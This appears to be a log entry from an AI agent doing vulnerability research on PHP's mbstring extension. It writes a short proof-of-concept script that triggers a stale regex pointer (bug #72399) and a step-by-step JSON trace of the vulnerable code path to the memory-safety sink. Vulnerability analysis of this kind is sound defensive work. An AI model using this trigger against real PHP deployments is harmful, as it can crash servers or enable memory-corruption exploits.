message:
Command `cd /workspace && cat > poc.php <<'EOF'
<?php
mb_ereg_search_init('abc', 'a');
mb_eregi_replace('a', '', 'a');
mb_ereg_search_pos();
mb_ereg_search_regs();
?>
EOF
cat > candidate_trace.json <<'EOF'
[
{"step":1,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1540,"var":"MBREX(search_str)","code":"ZVAL_STR_COPY(&MBREX(search_str), arg_str);","note":"The attacker primes the persistent search subject used by later mbregex APIs."},
{"step":2,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1551,"var":"MBREX(search_re)","code":"if (argc > 1) { MBREX(search_re) = php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, option, MBREX(current_mbctype), syntax); }","note":"A caller-supplied pattern is compiled into the global search_re cache entry."},
{"step":3,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_eregi_replace)","line":1224,"var":"re","code":"re = php_mbregex_compile_pattern(pattern, pattern_len, options, enc, syntax);","note":"A second API call compiles the same logical regex family and may reuse or invalidate the cached object associated with search_re."},
{"step":4,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"php_mbregex_compile_pattern","line":470,"var":"MBREX(search_re)","code":"if (rc == MBREX(search_re)) { /* reuse the new rc? see bug #72399 */ MBREX(search_re) = NULL; }","note":"When the cached regex object is reused, the module deliberately clears the global search_re pointer, creating the stale-alias condition underlying bug #72399."},
{"step":5,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"_php_mb_regex_ereg_search_exec","line":1438,"var":"MBREX(search_re)","code":"err = _php_mb_onig_search(MBREX(search_re), str, str + len, str + pos, str + len, MBREX(search_regs), 0);","note":"Subsequent search operations still use the global search state and can dereference the invalidated regex pointer."},
{"step":6,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_regs)","line":1592,"var":"MBREX(search_re)","code":"if (MBREX(search_regs) != NULL && Z_TYPE(MBREX(search_str)) == IS_STRING) { ... onig_foreach_name(MBREX(search_re), mb_regex_groups_iter, &args); }","note":"The final accessor walks named captures through the global regex pointer, which is the memory-safety sink if the pointer has become stale."}
]
EOF` executed with exit code 0.

